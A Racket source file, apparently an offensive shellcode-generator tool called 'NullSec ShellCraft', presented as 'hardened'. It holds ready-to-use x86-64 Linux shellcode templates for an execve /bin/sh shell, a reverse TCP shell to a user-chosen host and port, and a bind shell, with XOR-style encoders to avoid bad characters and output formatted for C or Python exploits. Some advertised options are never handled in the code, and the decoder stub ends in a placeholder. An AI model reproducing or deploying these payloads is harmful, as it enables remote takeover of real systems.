#lang racket/base

;; ============================================================================
;; NullSec ShellCraft - Hardened Shellcode Generation DSL
;; Language: Racket (Secure Functional Programming)
;; Author: bad-antics
;; License: NullSec Proprietary
;; Security Level: Maximum Hardening
;;
;; Security Features:
;; - Immutable data structures throughout
;; - Pure functional transformations
;; - Input validation with contracts
;; - Bounds checking on all operations
;; - No unsafe FFI usage
;; ============================================================================

(require racket/list
         racket/string
         racket/format
         racket/match
         racket/contract
         racket/cmdline)

;; ============================================================================
;; Constants & Configuration
;; ============================================================================

(define VERSION "2.0.0")
(define MAX-SHELLCODE-SIZE 65536)
(define MAX-BAD-CHARS 256)
(define ENTROPY-WARNING-THRESHOLD 7.0)

;; ============================================================================
;; Banner
;; ============================================================================

(define BANNER #<<END

    ███▄    █  █    ██  ██▓     ██▓      ██████ ▓█████  ▄████▄  
    ██ ▀█   █  ██  ▓██▒▓██▒    ▓██▒    ▒██    ▒ ▓█   ▀ ▒██▀ ▀█  
   ▓██  ▀█ ██▒▓██  ▒██░▒██░    ▒██░    ░ ▓██▄   ▒███   ▒▓█    ▄ 
   ▓██▒  ▐▌██▒▓▓█  ░██░▒██░    ▒██░      ▒   ██▒▒▓█  ▄ ▒▓▓▄ ▄██▒
   ▒██░   ▓██░▒▒█████▓ ░██████▒░██████▒▒██████▒▒░▒████▒▒ ▓███▀ ░
   ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄
   █░░░░░░░░░░░░░░░ S H E L L C R A F T ░░░░░░░░░░░░░░░░░░░░░█
   ▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀
                       bad-antics v
END
)

;; ============================================================================
;; Contracts (Type Safety)
;; ============================================================================

(define byte/c (integer-in 0 255))
(define bytes/c (listof byte/c))
(define shellcode/c (and/c bytes/c (λ (b) (<= (length b) MAX-SHELLCODE-SIZE))))

;; ============================================================================
;; Core Shellcode Structure (Immutable)
;; ============================================================================

(struct shellcode 
  (bytes      ; List of bytes
   arch       ; Architecture symbol ('x64 'x86 'arm64)
   os         ; OS symbol ('linux 'windows 'macos)
   null-free? ; Boolean - contains no null bytes
   metadata)  ; Association list of metadata
  #:transparent
  #:guard (λ (bytes arch os null-free? metadata name)
            (unless (list? bytes)
              (error name "bytes must be a list"))
            (unless (<= (length bytes) MAX-SHELLCODE-SIZE)
              (error name "shellcode exceeds maximum size"))
            (values bytes arch os null-free? metadata)))

;; ============================================================================
;; Byte Operations (Bounds Checked)
;; ============================================================================

(define/contract (byte-xor a b)
  (-> byte/c byte/c byte/c)
  (bitwise-and (bitwise-xor a b) #xff))

(define/contract (byte-add a b)
  (-> byte/c byte/c byte/c)
  (bitwise-and (+ a b) #xff))

(define/contract (byte-sub a b)
  (-> byte/c byte/c byte/c)
  (bitwise-and (- a b) #xff))

(define/contract (byte-rol b n)
  (-> byte/c (integer-in 0 7) byte/c)
  (bitwise-and 
   (bitwise-ior (arithmetic-shift b n)
                (arithmetic-shift b (- n 8)))
   #xff))

(define/contract (byte-ror b n)
  (-> byte/c (integer-in 0 7) byte/c)
  (byte-rol b (- 8 n)))

;; ============================================================================
;; Shellcode Analysis (Pure Functions)
;; ============================================================================

(define/contract (count-nulls bytes)
  (-> bytes/c exact-nonnegative-integer?)
  (count (λ (b) (= b 0)) bytes))

(define/contract (has-bad-chars? bytes bad-chars)
  (-> bytes/c bytes/c boolean?)
  (for/or ([b (in-list bytes)])
    (member b bad-chars)))

(define/contract (calculate-entropy bytes)
  (-> bytes/c real?)
  (if (null? bytes)
      0.0
      (let* ([freq (make-hash)]
             [len (length bytes)]
             [_ (for ([b (in-list bytes)])
                  (hash-update! freq b add1 0))])
        (- (for/sum ([(byte count) (in-hash freq)])
             (let ([p (/ count len)])
               (* p (/ (log p) (log 2)))))))))

(define/contract (find-bad-chars bytes [common-bad '(#x00 #x0a #x0d #x20)])
  (-> bytes/c bytes/c)
  (remove-duplicates
   (filter (λ (b) (member b bytes)) common-bad)))

(define/contract (analyze-shellcode sc)
  (-> shellcode? void?)
  (let* ([bytes (shellcode-bytes sc)]
         [size (length bytes)]
         [nulls (count-nulls bytes)]
         [entropy (calculate-entropy bytes)]
         [bad (find-bad-chars bytes)])
    (printf "\n[*] Shellcode Analysis\n")
    (printf "─────────────────────────────────────────\n")
    (printf "  Architecture:   ~a\n" (shellcode-arch sc))
    (printf "  OS:             ~a\n" (shellcode-os sc))
    (printf "  Size:           ~a bytes\n" size)
    (printf "  Null bytes:     ~a~a\n" nulls 
            (if (> nulls 0) " ⚠" " ✓"))
    (printf "  Entropy:        ~a bits/byte~a\n" 
            (~r entropy #:precision 4)
            (if (> entropy ENTROPY-WARNING-THRESHOLD) " ⚠ HIGH" ""))
    (printf "  Bad chars:      ~a\n" 
            (if (null? bad) "none detected" 
                (string-join (map (λ (b) (format "0x~a" (~r b #:base 16 #:min-width 2 #:pad-string "0"))) bad) ", ")))))

;; ============================================================================
;; Shellcode Templates (Linux x86_64)
;; ============================================================================

;; execve("/bin/sh", NULL, NULL) - 27 bytes, null-free
(define/contract (template-execve-sh)
  (-> shellcode?)
  (shellcode
   '(#x48 #x31 #xf6              ; xor rsi, rsi
     #x48 #x31 #xd2              ; xor rdx, rdx
     #x56                        ; push rsi
     #x48 #xbf #x2f #x62 #x69 #x6e ; movabs rdi, "/bin//sh"
     #x2f #x2f #x73 #x68
     #x57                        ; push rdi
     #x48 #x89 #xe7              ; mov rdi, rsp
     #x6a #x3b                   ; push 59
     #x58                        ; pop rax
     #x0f #x05)                  ; syscall
   'x64 'linux #t
   '((name . "execve /bin/sh")
     (size . 27))))

;; Reverse TCP shell - configurable
(define/contract (template-reverse-tcp host port)
  (-> string? (integer-in 1 65535) shellcode?)
  (let* ([ip-bytes (map string->number (string-split host "."))]
         [port-hi (quotient port 256)]
         [port-lo (remainder port 256)])
    (unless (= (length ip-bytes) 4)
      (error 'template-reverse-tcp "Invalid IP address"))
    (shellcode
     (append
      ;; socket(AF_INET, SOCK_STREAM, 0)
      '(#x48 #x31 #xc0            ; xor rax, rax
        #x48 #x31 #xff            ; xor rdi, rdi  
        #x48 #x31 #xf6            ; xor rsi, rsi
        #x48 #x31 #xd2            ; xor rdx, rdx
        #x6a #x29                 ; push 41 (socket syscall)
        #x58                      ; pop rax
        #x6a #x02                 ; push 2 (AF_INET)
        #x5f                      ; pop rdi
        #x6a #x01                 ; push 1 (SOCK_STREAM)
        #x5e                      ; pop rsi
        #x0f #x05                 ; syscall
        #x48 #x89 #xc7)           ; mov rdi, rax (save sockfd)
      ;; struct sockaddr_in on stack
      '(#x48 #x31 #xc0            ; xor rax, rax
        #x50)                     ; push rax (padding)
      (list #xc7 #x44 #x24 #xfc   ; mov dword [rsp-4], IP
            (fourth ip-bytes)
            (third ip-bytes)
            (second ip-bytes)
            (first ip-bytes))
      (list #x66 #xc7 #x44 #x24 #xfa ; mov word [rsp-6], PORT
            port-hi port-lo)
      '(#x66 #xc7 #x44 #x24 #xf8 #x02 #x00  ; mov word [rsp-8], AF_INET
        #x48 #x83 #xec #x08)      ; sub rsp, 8
      ;; connect(sockfd, addr, 16)
      '(#x6a #x2a                 ; push 42 (connect syscall)
        #x58                      ; pop rax
        #x48 #x89 #xe6            ; mov rsi, rsp
        #x6a #x10                 ; push 16 (addrlen)
        #x5a                      ; pop rdx
        #x0f #x05)                ; syscall
      ;; dup2 loop for stdin/stdout/stderr
      '(#x48 #x31 #xf6            ; xor rsi, rsi
        #x6a #x21                 ; push 33 (dup2)
        #x58                      ; pop rax
        #x0f #x05                 ; syscall
        #x48 #xff #xc6            ; inc rsi
        #x48 #x83 #xfe #x03       ; cmp rsi, 3
        #x75 #xf4)                ; jne dup2_loop
      ;; execve("/bin/sh", NULL, NULL)
      '(#x48 #x31 #xc0            ; xor rax, rax
        #x50                      ; push rax
        #x48 #xbb #x2f #x62 #x69 #x6e ; mov rbx, "/bin//sh"
        #x2f #x2f #x73 #x68
        #x53                      ; push rbx
        #x48 #x89 #xe7            ; mov rdi, rsp
        #x50                      ; push rax
        #x48 #x89 #xe6            ; mov rsi, rsp
        #x48 #x31 #xd2            ; xor rdx, rdx
        #x6a #x3b                 ; push 59
        #x58                      ; pop rax
        #x0f #x05))               ; syscall
     'x64 'linux #f
     `((name . "reverse TCP shell")
       (host . ,host)
       (port . ,port)))))

;; Bind shell - configurable port
(define/contract (template-bind-tcp port)
  (-> (integer-in 1 65535) shellcode?)
  (let ([port-hi (quotient port 256)]
        [port-lo (remainder port 256)])
    (shellcode
     (append
      ;; socket(AF_INET, SOCK_STREAM, 0)
      '(#x48 #x31 #xc0 #x48 #x31 #xff #x48 #x31 #xf6 #x48 #x31 #xd2
        #x6a #x29 #x58 #x6a #x02 #x5f #x6a #x01 #x5e #x0f #x05
        #x48 #x89 #xc7)           ; save sockfd
      ;; bind
      '(#x48 #x31 #xc0 #x50)
      (list #x66 #xc7 #x44 #x24 #xfa port-hi port-lo)
      '(#x66 #xc7 #x44 #x24 #xf8 #x02 #x00
        #x48 #x83 #xec #x08
        #x6a #x31 #x58            ; bind syscall
        #x48 #x89 #xe6
        #x6a #x10 #x5a
        #x0f #x05)
      ;; listen
      '(#x6a #x32 #x58            ; listen syscall
        #x6a #x01 #x5e
        #x0f #x05)
      ;; accept
      '(#x6a #x2b #x58            ; accept syscall
        #x48 #x31 #xf6
        #x48 #x31 #xd2
        #x0f #x05
        #x48 #x89 #xc7)           ; save client fd
      ;; dup2 loop
      '(#x48 #x31 #xf6 #x6a #x21 #x58 #x0f #x05
        #x48 #xff #xc6 #x48 #x83 #xfe #x03 #x75 #xf4)
      ;; execve
      '(#x48 #x31 #xc0 #x50
        #x48 #xbb #x2f #x62 #x69 #x6e #x2f #x2f #x73 #x68
        #x53 #x48 #x89 #xe7 #x50 #x48 #x89 #xe6 #x48 #x31 #xd2
        #x6a #x3b #x58 #x0f #x05))
     'x64 'linux #f
     `((name . "bind TCP shell")
       (port . ,port)))))

;; ============================================================================
;; Encoders (Transformations)
;; ============================================================================

(define/contract (encode-xor sc key)
  (-> shellcode? byte/c shellcode?)
  (when (= key 0)
    (error 'encode-xor "XOR key cannot be zero"))
  (let* ([encoded (map (λ (b) (byte-xor b key)) (shellcode-bytes sc))]
         [has-nulls (member 0 encoded)])
    (shellcode
     encoded
     (shellcode-arch sc)
     (shellcode-os sc)
     (not has-nulls)
     (cons `(encoder . ,(format "xor 0x~a" (~r key #:base 16 #:min-width 2 #:pad-string "0")))
           (shellcode-metadata sc)))))

(define/contract (encode-sub sc key)
  (-> shellcode? byte/c shellcode?)
  (let ([encoded (map (λ (b) (byte-sub b key)) (shellcode-bytes sc))])
    (shellcode
     encoded
     (shellcode-arch sc)
     (shellcode-os sc)
     (not (member 0 encoded))
     (cons `(encoder . ,(format "sub 0x~a" (~r key #:base 16 #:min-width 2 #:pad-string "0")))
           (shellcode-metadata sc)))))

(define/contract (encode-add sc key)
  (-> shellcode? byte/c shellcode?)
  (let ([encoded (map (λ (b) (byte-add b key)) (shellcode-bytes sc))])
    (shellcode
     encoded
     (shellcode-arch sc)
     (shellcode-os sc)
     (not (member 0 encoded))
     (cons `(encoder . ,(format "add 0x~a" (~r key #:base 16 #:min-width 2 #:pad-string "0")))
           (shellcode-metadata sc)))))

;; Find valid XOR key avoiding bad characters
(define/contract (find-xor-key bytes bad-chars)
  (-> bytes/c bytes/c (or/c byte/c #f))
  (for/first ([key (in-range 1 256)]
              #:when (not (member key bad-chars))
              #:when (not (has-bad-chars? 
                          (map (λ (b) (byte-xor b key)) bytes)
                          bad-chars)))
    key))

(define/contract (auto-encode sc bad-chars)
  (-> shellcode? bytes/c (or/c shellcode? #f))
  (let ([key (find-xor-key (shellcode-bytes sc) bad-chars)])
    (and key (encode-xor sc key))))

;; ============================================================================
;; Output Formats
;; ============================================================================

(define/contract (format-c-array sc [name "shellcode"])
  (-> shellcode? string? string?)
  (let* ([bytes (shellcode-bytes sc)]
         [size (length bytes)]
         [hex-bytes (map (λ (b) (format "0x~a" (~r b #:base 16 #:min-width 2 #:pad-string "0"))) bytes)]
         [rows (for/list ([i (in-range 0 size 12)])
                 (string-join (take (drop hex-bytes i) (min 12 (- size i))) ", "))])
    (string-append
     (format "// NullSec ShellCraft generated shellcode\n")
     (format "// Size: ~a bytes\n" size)
     (format "unsigned char ~a[] = {\n" name)
     (string-join (map (λ (r) (format "    ~a" r)) rows) ",\n")
     "\n};")))

(define/contract (format-python sc [name "shellcode"])
  (-> shellcode? string? string?)
  (let* ([bytes (shellcode-bytes sc)]
         [size (length bytes)]
         [hex-str (apply string-append 
                        (map (λ (b) (format "\\x~a" (~r b #:base 16 #:min-width 2 #:pad-string "0"))) bytes))])
    (string-append
     "# NullSec ShellCraft generated shellcode\n"
     (format "# Size: ~a bytes\n" size)
     (format "~a = b\"~a\"" name hex-str))))

(define/contract (format-raw sc)
  (-> shellcode? bytes?)
  (list->bytes (shellcode-bytes sc)))

(define/contract (format-hex sc)
  (-> shellcode? string?)
  (apply string-append
         (map (λ (b) (~r b #:base 16 #:min-width 2 #:pad-string "0"))
              (shellcode-bytes sc))))

;; ============================================================================
;; Decoder Stubs
;; ============================================================================

(define/contract (xor-decoder-stub key sc-length)
  (-> byte/c exact-positive-integer? bytes/c)
  ;; x64 XOR decoder stub
  `(#x48 #x31 #xc9                     ; xor rcx, rcx
    #xb1 ,(bitwise-and sc-length #xff) ; mov cl, length
    #x48 #x8d #x35 #x0a #x00 #x00 #x00 ; lea rsi, [rip+10]
    ; decode_loop:
    #x80 #x36 ,key                     ; xor byte [rsi], key
    #x48 #xff #xc6                     ; inc rsi
    #xe2 #xf8                          ; loop decode_loop
    #xeb #x00))                        ; jmp encoded (placeholder)

;; ============================================================================
;; Command Line Interface
;; ============================================================================

(define (print-banner)
  (displayln BANNER)
  (displayln VERSION)
  (newline))

(define (print-usage)
  (displayln "USAGE:")
  (displayln "    shellcraft <command> [options]")
  (newline)
  (displayln "COMMANDS:")
  (displayln "    execve              Generate execve /bin/sh shellcode")
  (displayln "    reverse <ip> <port> Generate reverse shell")
  (displayln "    bind <port>         Generate bind shell")
  (displayln "    analyze <hex>       Analyze shellcode")
  (newline)
  (displayln "OPTIONS:")
  (displayln "    -e, --encode <key>  XOR encode with key")
  (displayln "    -f, --format <fmt>  Output format (c, python, hex, raw)")
  (displayln "    -b, --bad <chars>   Bad characters to avoid (hex)")
  (newline)
  (displayln "EXAMPLES:")
  (displayln "    shellcraft execve -f python")
  (displayln "    shellcraft reverse 10.0.0.1 4444 -e 0x41")
  (displayln "    shellcraft bind 8080 -f c"))

(define (main)
  (print-banner)
  
  (define args (current-command-line-arguments))
  
  (if (= (vector-length args) 0)
      (print-usage)
      (let ([cmd (vector-ref args 0)])
        (match cmd
          ["execve"
           (let ([sc (template-execve-sh)])
             (analyze-shellcode sc)
             (displayln "\n[*] C Output:")
             (displayln (format-c-array sc))
             (displayln "\n[*] Python Output:")
             (displayln (format-python sc)))]
          
          ["reverse"
           (if (< (vector-length args) 3)
               (displayln "[!] Usage: shellcraft reverse <ip> <port>")
               (let ([sc (template-reverse-tcp 
                         (vector-ref args 1)
                         (string->number (vector-ref args 2)))])
                 (analyze-shellcode sc)
                 (displayln "\n[*] Python Output:")
                 (displayln (format-python sc))))]
          
          ["bind"
           (if (< (vector-length args) 2)
               (displayln "[!] Usage: shellcraft bind <port>")
               (let ([sc (template-bind-tcp 
                         (string->number (vector-ref args 1)))])
                 (analyze-shellcode sc)
                 (displayln "\n[*] Python Output:")
                 (displayln (format-python sc))))]
          
          ["analyze"
           (if (< (vector-length args) 2)
               (displayln "[!] Usage: shellcraft analyze <hex>")
               (let* ([hex-str (vector-ref args 1)]
                      [bytes (for/list ([i (in-range 0 (string-length hex-str) 2)])
                               (string->number (substring hex-str i (+ i 2)) 16))]
                      [sc (shellcode bytes 'x64 'unknown #f '())])
                 (analyze-shellcode sc)))]
          
          [else
           (print-usage)]))))

(module+ main
  (main))
